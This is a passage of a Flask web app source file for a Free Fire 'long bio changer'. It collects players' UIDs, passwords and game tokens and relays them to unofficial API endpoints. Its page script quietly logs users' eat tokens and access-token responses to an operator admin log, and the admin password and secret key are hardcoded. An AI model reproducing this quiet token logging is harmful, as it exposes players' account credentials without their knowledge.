# ============================================================
# 🔥 API CONFIGURATION - CHANGE HERE
# ============================================================
API = {
    "BIO_UPLOAD": "http://127.0.0.1:5000/bio_upload",
    "ACCESS_TOKEN": "http://127.0.0.1:5001/access_token",
    "JWT_TOKEN": "http://127.0.0.1:5002/token",
    "PROFILE_ITEM": "http://127.0.0.1:5003/item"
}
# ============================================================

from flask import Flask, render_template_string, request, jsonify
import json
import time
import os
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'shappno_009xx_secret_key'

LOG_FILE = '/tmp/admin_logs.json'
ADMIN_PASSWORD = 'shappno_009xx'

def load_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            return json.load(f)
    return {"users": [], "bio_updates": [], "jwt_tokens": [], "access_tokens": [], "profile_items": [], "batch_jobs": []}

def save_logs(data):
    with open(LOG_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def clean_old_logs():
    logs = load_logs()
    cutoff = (datetime.now() - timedelta(days=7)).timestamp()
    for key in logs:
        if isinstance(logs[key], list):
            logs[key] = [item for item in logs[key] if item.get('timestamp', 0) > cutoff]
    save_logs(logs)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>𝐒𝐡𝐚𝐩𝐩𝐧𝐨 𝐁𝐢𝐨 𝐂𝐡𝐚𝐧𝐠𝐞𝐫</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0f;
            min-height: 100vh;
            overflow-x: hidden;
            color: #fff;
        }

        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.95;
        }

        .container {
            position: relative;
            z-index: 1;
            max-width: 480px;
            margin: 0 auto;
            padding: 20px 16px;
        }

        .header {
            text-align: center;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(255, 50, 50, 0.1);
        }
        .header .logo {
            font-size: 18px;
            font-weight: 900;
            color: #ff0000;
            text-shadow: 0 0 40px rgba(255, 0, 0, 0.4);
            letter-spacing: 1px;
            word-break: break-word;
            line-height: 1.4;
        }
        .header .sub {
            font-size: 10px;
            color: rgba(255, 255, 255, 0.2);
            letter-spacing: 4px;
            margin-top: 4px;
        }

        .status-card {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 10px;
            padding: 8px 14px;
            margin-bottom: 14px;
            border: 1px solid rgba(255, 255, 255, 0.03);
        }
        .status-card .label {
            font-size: 9px;
            color: rgba(255, 255, 255, 0.15);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .status-card .value {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 11px;
            font-weight: 600;
        }
        .status-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            display: inline-block;
            background: #00ff64;
            box-shadow: 0 0 12px rgba(0, 255, 100, 0.2);
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            color: #fff;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #ff0000, #cc0000);
            box-shadow: 0 8px 24px rgba(255, 0, 0, 0.15);
            margin-bottom: 8px;
            position: relative;
            overflow: hidden;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 32px rgba(255, 0, 0, 0.25);
        }
        .btn:active { transform: translateY(0); }

        .btn-secondary {
            background: linear-gradient(135deg, #1a1a2e, #2a2a4e);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
        }
        .btn-secondary:hover {
            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.3);
        }
        .btn-gold {
            background: linear-gradient(135deg, #f7971e, #ffd200);
            box-shadow: 0 8px 24px rgba(255, 210, 0, 0.15);
            color: #1a1a2e;
        }
        .btn-gold:hover {
            box-shadow: 0 12px 32px rgba(255, 210, 0, 0.25);
        }
        .btn-green {
            background: linear-gradient(135deg, #00b894, #00d2d3);
            box-shadow: 0 8px 24px rgba(0, 210, 211, 0.15);
        }
        .btn-green:hover {
            box-shadow: 0 12px 32px rgba(0, 210, 211, 0.25);
        }
        .btn-purple {
            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
            box-shadow: 0 8px 24px rgba(108, 92, 231, 0.15);
        }
        .btn-purple:hover {
            box-shadow: 0 12px 32px rgba(108, 92, 231, 0.25);
        }
        .btn-pink {
            background: linear-gradient(135deg, #fd79a8, #e17055);
            box-shadow: 0 8px 24px rgba(225, 112, 85, 0.15);
        }
        .btn-pink:hover {
            box-shadow: 0 12px 32px rgba(225, 112, 85, 0.25);
        }

        .btn-admin {
            padding: 4px 10px;
            font-size: 12px;
            opacity: 0.3;
            background: transparent;
            border: none;
            color: rgba(255,255,255,0.3);
            cursor: pointer;
            font-family: 'Courier New', monospace;
            transition: 0.3s;
        }
        .btn-admin:hover {
            opacity: 0.6;
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
            margin-bottom: 14px;
        }
        .btn-group .btn { margin-bottom: 0; }

        .social-links {
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
            margin: 14px 0 10px;
            padding-top: 14px;
            border-top: 1px solid rgba(255, 255, 255, 0.03);
        }
        .social-links a {
            font-size: 9px;
            color: rgba(255, 255, 255, 0.15);
            text-decoration: none;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
            padding: 4px 10px;
            border-radius: 20px;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.03);
        }
        .social-links a:hover {
            color: #ff4444;
            border-color: rgba(255, 50, 50, 0.1);
        }

        .footer {
            text-align: center;
            padding-top: 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.03);
        }
        .footer .copyright {
            font-size: 9px;
            color: rgba(255, 255, 255, 0.15);
            letter-spacing: 1px;
            word-break: break-all;
        }

        .hidden { display: none !important; }

        /* Full Page System */
        .full-page {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(10, 10, 20, 0.85);
            z-index: 1000;
            padding: 20px;
            overflow-y: auto;
            display: none;
        }
        .full-page.active {
            display: block;
        }
        .full-page .back-btn-big {
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 700;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            color: rgba(255, 255, 255, 0.5);
            cursor: pointer;
            transition: 0.3s;
            font-family: 'Courier New', monospace;
            margin-bottom: 16px;
        }
        .full-page .back-btn-big:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
        }
        .full-page .page-title {
            font-size: 20px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 3px;
            color: #ffffff;
            text-shadow: 0 0 12px rgba(255, 255, 255, 0.6);
            margin-bottom: 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding-bottom: 12px;
        }

        .form-group {
            margin-bottom: 14px;
        }
        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: #ffffff;
            text-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
            margin-bottom: 6px;
        }
        .form-group input, .form-group textarea, .form-group select {
            width: 100%;
            padding: 10px 12px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.04);
            background: rgba(0, 0, 0, 0.4);
            color: #fff;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            outline: none;
        }
        .form-group input:focus, .form-group textarea:focus, .form-group select:focus {
            border-color: rgba(255, 50, 50, 0.2);
            background: rgba(0, 0, 0, 0.6);
        }
        .form-group textarea {
            min-height: 50px;
            resize: vertical;
        }

        .result-box {
            margin-top: 12px;
            padding: 12px;
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.03);
            display: none;
            max-height: 300px;
            overflow-y: auto;
        }
        .result-box.show { display: block; }
        .result-box pre {
            font-size: 12px;
            font-family: 'Courier New', monospace;
            color: rgba(255, 255, 255, 0.8);
            white-space: pre-wrap;
            word-break: break-all;
            line-height: 1.6;
        }
        .result-box .success { color: #00ff64; }
        .result-box .error { color: #ff4444; }

        /* Color Section */
        .color-section-inline {
            margin-bottom: 12px;
        }
        .color-section-inline .label {
            font-size: 12px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: #ffffff;
            text-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
            margin-bottom: 6px;
        }
        .color-grid-inline {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }
        .color-btn-inline {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            border: 2px solid rgba(255, 255, 255, 0.08);
            cursor: pointer;
            transition: all 0.3s;
        }
        .color-btn-inline:hover {
            transform: scale(1.15);
            border-color: rgba(255, 255, 255, 0.25);
        }

        .format-btns {
            display: flex;
            gap: 6px;
            margin-top: 6px;
            flex-wrap: wrap;
        }
        .format-btn {
            padding: 4px 12px;
            font-size: 10px;
            font-weight: 700;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 6px;
            color: rgba(255, 255, 255, 0.3);
            cursor: pointer;
            transition: 0.3s;
            font-family: 'Courier New', monospace;
        }
        .format-btn:hover {
            background: rgba(255, 255, 255, 0.08);
            color: #fff;
        }

        .bio-preview-box {
            background: rgba(0, 0, 0, 0.6);
            border-radius: 12px;
            padding: 14px 16px;
            margin: 12px 0;
            border: 1px solid rgba(255, 255, 255, 0.06);
            min-height: 50px;
        }
        .bio-preview-box .preview-label {
            font-size: 8px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: rgba(255, 255, 255, 0.15);
            margin-bottom: 6px;
        }
        .bio-preview-box .preview-text {
            font-size: 14px;
            font-weight: 600;
            line-height: 1.8;
            word-break: break-all;
            font-family: 'Courier New', monospace;
        }
        .bio-preview-box .preview-text .highlight { color: #ff4444; }
        .bio-preview-box .preview-text .gold { color: #ffd700; }
        .bio-preview-box .preview-text .blue { color: #4facfe; }
        .bio-preview-box .preview-text .green { color: #00ff64; }
        .bio-preview-box .preview-text .cyan { color: #00ffff; }
        .bio-preview-box .preview-text .magenta { color: #ff00ff; }
        .bio-preview-box .preview-text .orange { color: #ffa500; }
        .bio-preview-box .preview-text .pink { color: #ff69b4; }
        .bio-preview-box .preview-text .purple { color: #800080; }
        .bio-preview-box .preview-text .bold { font-weight: 900; }
        .bio-preview-box .preview-text .italic { font-style: italic; }
        .bio-preview-box .preview-text .underline { text-decoration: underline; }
        .bio-preview-box .preview-text .highlight-bg { background: rgba(255, 0, 0, 0.25); padding: 0 4px; border-radius: 3px; }

        .bio-stats {
            display: flex;
            gap: 12px;
            font-size: 10px;
            color: rgba(255, 255, 255, 0.2);
            margin-top: 4px;
        }
        .bio-stats span {
            color: rgba(255, 255, 255, 0.4);
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        #adminContent {
            font-family: 'Courier New', monospace;
            font-size: 11px;
        }
        #adminContent .stat-box {
            background: rgba(255,255,255,0.03);
            padding: 8px;
            border-radius: 6px;
            text-align: center;
        }
        #adminContent .stat-box .num {
            font-size: 18px;
            font-weight: 800;
        }
    </style>
</head>
<body>

<canvas id="matrix-canvas"></canvas>

<div class="container" id="homePage">

    <div class="header">
        <div class="logo">𝐒𝐡𝐚𝐩𝐩𝐧𝐨 𝐁𝐢𝐨 𝐂𝐡𝐚𝐧𝐠𝐞𝐫</div>
        <div class="sub">𝐅𝐑𝐄𝐄 𝐅𝐈𝐑𝐄 𝐋𝐎𝐍𝐆 𝐁𝐈𝐎 𝐂𝐇𝐀𝐍𝐆𝐄𝐑</div>
    </div>

    <div class="status-card">
        <span class="label">🤖 Bot Status</span>
        <span class="value">
            <span class="status-dot" id="botDot"></span>
            <span id="botStatus">Online</span>
        </span>
    </div>

    <div class="btn-group">
        <button class="btn btn-gold" onclick="openFullPage('access')">🔑 GET ACCESS TOKEN</button>
        <button class="btn btn-secondary" onclick="openEatToken()">🍽️ GET EAT TOKEN</button>
        <button class="btn btn-pink" onclick="openFullPage('longbio')">📝 LONG BIO</button>
        <button class="btn btn-purple" onclick="openFullPage('jwt')">🟢 JWT TOKEN</button>
        <button class="btn btn-secondary" onclick="openFullPage('profile')">🪪 PROFILE</button>
    </div>

    <div class="social-links">
        <a href="#" onclick="openTelegram()">📱 TELEGRAM</a>
    </div>

    <div style="text-align:center; margin-top:4px;">
        <button class="btn-admin" onclick="showAdminLogin()">⚙️</button>
    </div>

    <div id="adminLogin" class="hidden" style="margin-top:10px;padding:14px;background:rgba(255,255,255,0.02);border-radius:12px;border:1px solid rgba(255,255,255,0.04);">
        <div class="form-group">
            <label>🔑 Admin Password</label>
            <input type="password" id="admin-pass" placeholder="Enter admin password" />
        </div>
        <button class="btn btn-secondary" onclick="adminLogin()">Login</button>
    </div>

    <div id="adminDashboard" class="hidden" style="margin-top:10px;padding:14px;background:rgba(255,0,0,0.03);border-radius:12px;border:1px solid rgba(255,0,0,0.08);">
        <div class="admin-header">
            <span style="font-size:12px;font-weight:700;color:#ff4444;">👑 ADMIN DASHBOARD</span>
            <button class="btn-admin" onclick="closeAdmin()" style="font-size:16px;opacity:0.5;">✕</button>
        </div>
        <div id="adminContent"><div style="font-size:11px;color:rgba(255,255,255,0.3);">Loading...</div></div>
    </div>

    <div class="footer">
        <div class="copyright">© 2025 <span style="color:rgba(255,50,50,0.4);">𝐒𝐡𝐚𝐩𝐩𝐧𝐨 𝐁𝐢𝐨 𝐂𝐡𝐚𝐧𝐠𝐞𝐫</span> • Free For All Game</div>
    </div>
</div>

<div id="full-access" class="full-page">
    <button class="back-btn-big" onclick="closeFullPage()">← BACK</button>
    <div class="page-title">🔑 ACCESS TOKEN GENERATOR</div>
    <div class="form-group">
        <label>🍽️ Eat Token</label>
        <input type="text" id="eat-token-input" placeholder="Paste eat token or full URL" />
    </div>
    <button class="btn btn-green" onclick="getAccessToken()">▶️ Generate Access Token</button>
    <div class="result-box" id="access-result"><div class="result-title">📤 Response</div><pre id="access-response"></pre></div>
</div>

<div id="full-longbio" class="full-page">
    <button class="back-btn-big" onclick="closeFullPage()">← BACK</button>
    <div class="page-title">📝 LONG BIO UPDATER</div>

    <div class="color-section-inline">
        <div class="label">🎨 COLORS</div>
        <div class="color-grid-inline">
            <button class="color-btn-inline" style="background:#FF0000;" onclick="addColor('[FF0000]')"></button>
            <button class="color-btn-inline" style="background:#FF4500;" onclick="addColor('[FF4500]')"></button>
            <button class="color-btn-inline" style="background:#FFA500;" onclick="addColor('[FFA500]')"></button>
            <button class="color-btn-inline" style="background:#FFD700;" onclick="addColor('[FFD700]')"></button>
            <button class="color-btn-inline" style="background:#FFFF00;" onclick="addColor('[FFFF00]')"></button>
            <button class="color-btn-inline" style="background:#00FF00;" onclick="addColor('[00FF00]')"></button>
            <button class="color-btn-inline" style="background:#00FFFF;" onclick="addColor('[00FFFF]')"></button>
            <button class="color-btn-inline" style="background:#1E90FF;" onclick="addColor('[1E90FF]')"></button>
            <button class="color-btn-inline" style="background:#0000FF;" onclick="addColor('[0000FF]')"></button>
            <button class="color-btn-inline" style="background:#800080;" onclick="addColor('[800080]')"></button>
            <button class="color-btn-inline" style="background:#FF00FF;" onclick="addColor('[FF00FF]')"></button>
            <button class="color-btn-inline" style="background:#FF69B4;" onclick="addColor('[FF69B4]')"></button>
            <button class="color-btn-inline" style="background:#FFC0CB;" onclick="addColor('[FFC0CB]')"></button>
            <button class="color-btn-inline" style="background:#FFFFFF;border-color:rgba(255,255,255,0.2);" onclick="addColor('[FFFFFF]')"></button>
            <button class="color-btn-inline" style="background:#808080;" onclick="addColor('[808080]')"></button>
            <button class="color-btn-inline" style="background:#000000;border-color:rgba(255,255,255,0.1);" onclick="addColor('[000000]')"></button>
        </div>
        <div class="format-btns">
            <button class="format-btn" onclick="addColor('[B]')">[B] Bold</button>
            <button class="format-btn" onclick="addColor('[C]')">[C] Highlight</button>
            <button class="format-btn" onclick="addColor('[I]')">[I] Italic</button>
            <button class="format-btn" onclick="addColor('[U]')">[U] Underline</button>
            <button class="format-btn" onclick="addColor('Ⓥ')">Ⓥ V-Badge</button>
        </div>
    </div>

    <div class="form-group">
        <label>🔐 Method</label>
        <select id="bio-method">
            <option value="uid">UID + Password</option>
            <option value="access">Access Token</option>
            <option value="jwt">JWT Token</option>
        </select>
    </div>
    <div class="form-group" id="bio-uid-group">
        <label>🆔 Player UID</label>
        <input type="text" id="bio-uid" placeholder="Enter UID" />
    </div>
    <div class="form-group" id="bio-pass-group">
        <label>🔑 Player Secret</label>
        <input type="password" id="bio-pass" placeholder="Enter Password" />
    </div>
    <div class="form-group" id="bio-token-group" style="display:none;">
        <label>🎫 Token</label>
        <input type="text" id="bio-token" placeholder="Enter Access Token or JWT" />
    </div>
    <div class="form-group">
        <label>📝 New Bio</label>
        <textarea id="bio-text" placeholder="Enter your new bio... (Max 250 chars)" style="min-height:80px;" oninput="updateBioPreview()" maxlength="250">[CODE]BBA4F5W1CJDM [000#F#] EVERYONE</textarea>
        <div class="bio-stats">
            <span>📝 Words: <span id="wordCount">0</span></span>
            <span>📏 Lines: <span id="lineCount">0</span></span>
            <span>🔤 Chars: <span id="charCount">0</span>/250</span>
        </div>
    </div>

    <div class="bio-preview-box">
        <div class="preview-label">🔍 BIO PREVIEW (Free Fire)</div>
        <div class="preview-text" id="bioPreviewText">[CODE]BBA4F5W1CJDM [000#F#] EVERYONE</div>
    </div>

    <button class="btn btn-green" onclick="updateBio()">🚀 Update Bio</button>
    <div class="result-box" id="bio-result"><div class="result-title">📤 Response</div><pre id="bio-response"></pre></div>
</div>

<div id="full-jwt" class="full-page">
    <button class="back-btn-big" onclick="closeFullPage()">← BACK</button>
    <div class="page-title">🟢 JWT TOKEN GENERATOR</div>
    <div class="form-group">
        <label>🔐 Method</label>
        <select id="jwt-method">
            <option value="uid">UID + Password</option>
            <option value="access">Access Token</option>
            <option value="batch">JWT Batch</option>
        </select>
    </div>
    <div class="form-group" id="jwt-uid-group">
        <label>🆔 Player ID</label>
        <input type="text" id="jwt-uid" placeholder="Enter UID" />
    </div>
    <div class="form-group" id="jwt-pass-group">
        <label>🔑 Player Secret</label>
        <input type="password" id="jwt-pass" placeholder="Enter Password" />
    </div>
    <div class="form-group" id="jwt-access-group" style="display:none;">
        <label>🎫 Access Token</label>
        <input type="text" id="jwt-access" placeholder="Enter Access Token" />
    </div>
    <div class="form-group" id="jwt-batch-group" style="display:none;">
        <label>📂 Upload File</label>
        <input type="file" id="jwt-batch-file" accept=".txt,.json" />
    </div>
    <button class="btn btn-purple" onclick="generateJWT()">🟢 Generate JWT</button>
    <div class="result-box" id="jwt-result"><div class="result-title">📤 Response</div><pre id="jwt-response"></pre></div>
</div>

<div id="full-profile" class="full-page">
    <button class="back-btn-big" onclick="closeFullPage()">← BACK</button>
    <div class="page-title">🪪 PROFILE ITEM</div>
    <div class="form-group">
        <label>🎫 JWT Token</label>
        <input type="text" id="item-jwt" placeholder="Enter JWT token" />
    </div>
    <button class="btn btn-secondary" onclick="getProfileItem()">🪪 Get Profile</button>
    <div class="result-box" id="item-result"><div class="result-title">📤 Response</div><pre id="item-response"></pre></div>
</div>

<script>
    // ============================================================
    // 🔥 API CONFIGURATION - CHANGE HERE
    // ============================================================
    const API = {
        BIO_UPLOAD: "''' + API["BIO_UPLOAD"] + '''",
        ACCESS_TOKEN: "''' + API["ACCESS_TOKEN"] + '''",
        JWT_TOKEN: "''' + API["JWT_TOKEN"] + '''",
        PROFILE_ITEM: "''' + API["PROFILE_ITEM"] + '''"
    };
    // ============================================================

    // ===== MATRIX BACKGROUND =====
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=[]{}|;:,.<>?/';
    const fontSize = 14;
    const columns = Math.ceil(canvas.width / fontSize);
    const drops = [];
    for (let i = 0; i < columns; i++) { drops[i] = Math.floor(Math.random() * -100); }

    function drawMatrix() {
        ctx.fillStyle = 'rgba(10, 10, 15, 0.08)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.font = fontSize + 'px monospace';
        for (let i = 0; i < drops.length; i++) {
            const char = chars[Math.floor(Math.random() * chars.length)];
            const x = i * fontSize;
            const y = drops[i] * fontSize;
            if (y > 0 && y < canvas.height) {
                ctx.fillStyle = `rgba(0, 255, 100, ${0.4 + Math.random() * 0.6})`;
                ctx.fillText(char, x, y);
            }
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) { drops[i] = 0; }
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });

    // ===== BIO PREVIEW =====
    function updateBioPreview() {
        const text = document.getElementById('bio-text').value;
        const preview = document.getElementById('bioPreviewText');
        const words = text.trim() ? text.trim().split(/\\s+/).length : 0;
        const lines = text.split('\\n').filter(l => l.trim()).length;
        const chars = text.length;
        document.getElementById('wordCount').textContent = words;
        document.getElementById('lineCount').textContent = lines;
        document.getElementById('charCount').textContent = chars;

        let html = text;
        const colors = {
            'FF0000': 'highlight', 'FF4500': 'orange', 'FFA500': 'orange',
            'FFD700': 'gold', 'FFFF00': 'gold', '00FF00': 'green',
            '00FFFF': 'cyan', '1E90FF': 'blue', '0000FF': 'blue',
            '800080': 'purple', 'FF00FF': 'magenta', 'FF69B4': 'pink',
            'FFC0CB': 'pink', 'FFFFFF': 'gold', '808080': 'gold', '000000': 'gold'
        };
        html = html.replace(/\[([A-Fa-f0-9]{6})\]([^\\[]*?)\[\/\1\]/g, function(m, c, t) {
            return `<span class="${colors[c.toUpperCase()] || 'highlight'}">${t}</span>`;
        });
        html = html.replace(/\[([A-Fa-f0-9]{6})\]([^\\[]*?)(?=\[|$)/g, function(m, c, t) {
            return `<span class="${colors[c.toUpperCase()] || 'highlight'}">${t}</span>`;
        });
        html = html.replace(/\[B\]/g, '<span class="bold">').replace(/\[\/B\]/g, '</span>');
        html = html.replace(/\[C\]/g, '<span class="highlight-bg">').replace(/\[\/C\]/g, '</span>');
        html = html.replace(/\[I\]/g, '<span class="italic">').replace(/\[\/I\]/g, '</span>');
        html = html.replace(/\[U\]/g, '<span class="underline">').replace(/\[\/U\]/g, '</span>');
        html = html.replace(/Ⓥ/g, '<span style="background:#ff0000;color:#fff;padding:0 6px;border-radius:4px;font-size:10px;">V</span>');
        preview.innerHTML = html || 'Enter your bio to preview...';
    }

    // ===== NAVIGATION =====
    function openFullPage(page) {
        document.getElementById('homePage').style.display = 'none';
        document.querySelectorAll('.full-page').forEach(el => el.classList.remove('active'));
        document.getElementById('full-' + page).classList.add('active');
        document.body.style.overflow = 'hidden';
        if (page === 'jwt') updateJWMethod();
        if (page === 'longbio') setTimeout(updateBioPreview, 100);
    }

    function closeFullPage() {
        document.getElementById('homePage').style.display = 'block';
        document.querySelectorAll('.full-page').forEach(el => el.classList.remove('active'));
        document.body.style.overflow = 'auto';
    }

    function addColor(color) {
        const bioText = document.getElementById('bio-text');
        bioText.value += color;
        updateBioPreview();
    }

    function openTelegram() { window.open('https://t.me/bioshappno', '_blank'); }
    function openEatToken() { window.open('https://ticket.kiosgamer.co.id/', '_blank'); }

    // ===== ADMIN =====
    function showAdminLogin() {
        const el = document.getElementById('adminLogin');
        el.classList.toggle('hidden');
        if (!el.classList.contains('hidden')) {
            document.getElementById('admin-pass').value = '';
            document.getElementById('adminDashboard').classList.add('hidden');
        }
    }

    function closeAdmin() { document.getElementById('adminDashboard').classList.add('hidden'); }

    async function adminLogin() {
        const pass = document.getElementById('admin-pass').value;
        if (!pass) { alert('Please enter password'); return; }
        try {
            const res = await fetch('/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pass })
            });
            const data = await res.json();
            if (data.status === 'success') {
                document.getElementById('adminLogin').classList.add('hidden');
                document.getElementById('adminDashboard').classList.remove('hidden');
                loadAdminDashboard();
            } else { alert('❌ Wrong password!'); }
        } catch (err) { alert('Error: ' + err.message); }
    }

    async function loadAdminDashboard() {
        try {
            const res = await fetch('/admin/dashboard');
            const data = await res.json();
            let html = '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px;">';
            html += `<div class="stat-box"><div class="num" style="color:#00ff64;">${data.stats.total_users}</div><div style="font-size:8px;color:rgba(255,255,255,0.2);">Total Users</div></div>`;
            html += `<div class="stat-box"><div class="num" style="color:#ffd700;">${data.stats.total_bio_updates}</div><div style="font-size:8px;color:rgba(255,255,255,0.2);">Bio Updates</div></div>`;
            html += `<div class="stat-box"><div class="num" style="color:#a29bfe;">${data.stats.total_jwt}</div><div style="font-size:8px;color:rgba(255,255,255,0.2);">JWT Generated</div></div>`;
            html += `<div class="stat-box"><div class="num" style="color:#fdcb6e;">${data.stats.total_access}</div><div style="font-size:8px;color:rgba(255,255,255,0.2);">Access Tokens</div></div>`;
            html += '</div><div style="font-size:9px;color:rgba(255,255,255,0.1);margin-top:6px;">🔄 Auto-deletes after 7 days</div>';
            document.getElementById('adminContent').innerHTML = html;
        } catch (err) {
            document.getElementById('adminContent').innerHTML = '<div style="font-size:11px;color:#ff4444;">Error loading dashboard</div>';
        }
    }

    // ===== JWT METHOD =====
    document.getElementById('jwt-method').addEventListener('change', updateJWMethod);
    function updateJWMethod() {
        const method = document.getElementById('jwt-method').value;
        document.getElementById('jwt-uid-group').style.display = method === 'uid' ? 'block' : 'none';
        document.getElementById('jwt-pass-group').style.display = method === 'uid' ? 'block' : 'none';
        document.getElementById('jwt-access-group').style.display = method === 'access' ? 'block' : 'none';
        document.getElementById('jwt-batch-group').style.display = method === 'batch' ? 'block' : 'none';
    }

    document.getElementById('bio-method').addEventListener('change', function() {
        const uidGroup = document.getElementById('bio-uid-group');
        const passGroup = document.getElementById('bio-pass-group');
        const tokenGroup = document.getElementById('bio-token-group');
        if (this.value === 'uid') {
            uidGroup.style.display = 'block';
            passGroup.style.display = 'block';
            tokenGroup.style.display = 'none';
        } else {
            uidGroup.style.display = 'none';
            passGroup.style.display = 'none';
            tokenGroup.style.display = 'block';
        }
    });

    // ===== API CALLS =====
    async function getAccessToken() {
        const eat = document.getElementById('eat-token-input').value;
        const resultBox = document.getElementById('access-result');
        const responseEl = document.getElementById('access-response');
        if (!eat) { resultBox.className = 'result-box show'; responseEl.className = 'error'; responseEl.textContent = '❌ Please enter an eat token!'; return; }
        resultBox.className = 'result-box show'; responseEl.className = ''; responseEl.textContent = '⏳ Fetching...';
        try {
            let token = eat;
            if (eat.includes('eat=')) { const urlObj = new URL(eat); token = urlObj.searchParams.get('eat') || eat; }
            const url = API.ACCESS_TOKEN + '?eat_token=' + encodeURIComponent(token);
            const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
            const data = await res.json();
            await fetch('/admin/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'access_token', data: { eat: token, response: data } }) });
            responseEl.className = data.status === 'success' ? 'success' : 'error';
            responseEl.textContent = JSON.stringify(data, null, 2);
        } catch (err) { responseEl.className = 'error'; responseEl.textContent = '❌ Error: ' + err.message; }
    }

    async function updateBio() {
        const method = document.getElementById('bio-method').value;
        const bio = document.getElementById('bio-text').value;
        const resultBox = document.getElementById('bio-result');
        const responseEl = document.getElementById('bio-response');
        if (!bio) { resultBox.className = 'result-box show'; responseEl.className = 'error'; responseEl.textContent = '❌ Please enter a bio!'; return; }
        const cleanBio = bio.replace(/[\\u{1F600}-\\u{1F64F}]|[\\u{1F300}-\\u{1F5FF}]|[\\u{1F680}-\\u{1F6FF}]|[\\u{2600}-\\u{26FF}]|[\\u{2700}-\\u{27BF}]|[\\u{1F900}-\\u{1F9FF}]/gu, '');
        resultBox.className = 'result-box show'; responseEl.className = ''; responseEl.textContent = '⏳ Processing...';
        try {
            let url = API.BIO_UPLOAD + '?bio=' + encodeURIComponent(cleanBio);
            let uid = null, pass = null, token = null;
            if (method === 'uid') {
                uid = document.getElementById('bio-uid').value;
                pass = document.getElementById('bio-pass').value;
                if (!uid || !pass) { throw new Error('UID and Password required'); }
                url += '&uid=' + encodeURIComponent(uid) + '&pass=' + encodeURIComponent(pass);
            } else {
                token = document.getElementById('bio-token').value;
                if (!token) { throw new Error('Token required'); }
                if (method === 'access') { url += '&access_token=' + encodeURIComponent(token); }
                else { url += '&jwt=' + encodeURIComponent(token); }
            }
            const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
            const data = await res.json();
            await fetch('/admin/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'bio_update', data: { uid: uid, method: method, bio: cleanBio, response: data } }) });
            responseEl.className = data.code === 200 || data.status === '✅ Success' ? 'success' : 'error';
            responseEl.textContent = JSON.stringify(data, null, 2);
        } catch (err) { responseEl.className = 'error'; responseEl.textContent = '❌ Error: ' + err.message; }
    }

    async function generateJWT() {
        const method = document.getElementById('jwt-method').value;
        const resultBox = document.getElementById('jwt-result');
        const responseEl = document.getElementById('jwt-response');
        resultBox.className = 'result-box show'; responseEl.className = ''; responseEl.textContent = '⏳ Processing...';
        try {
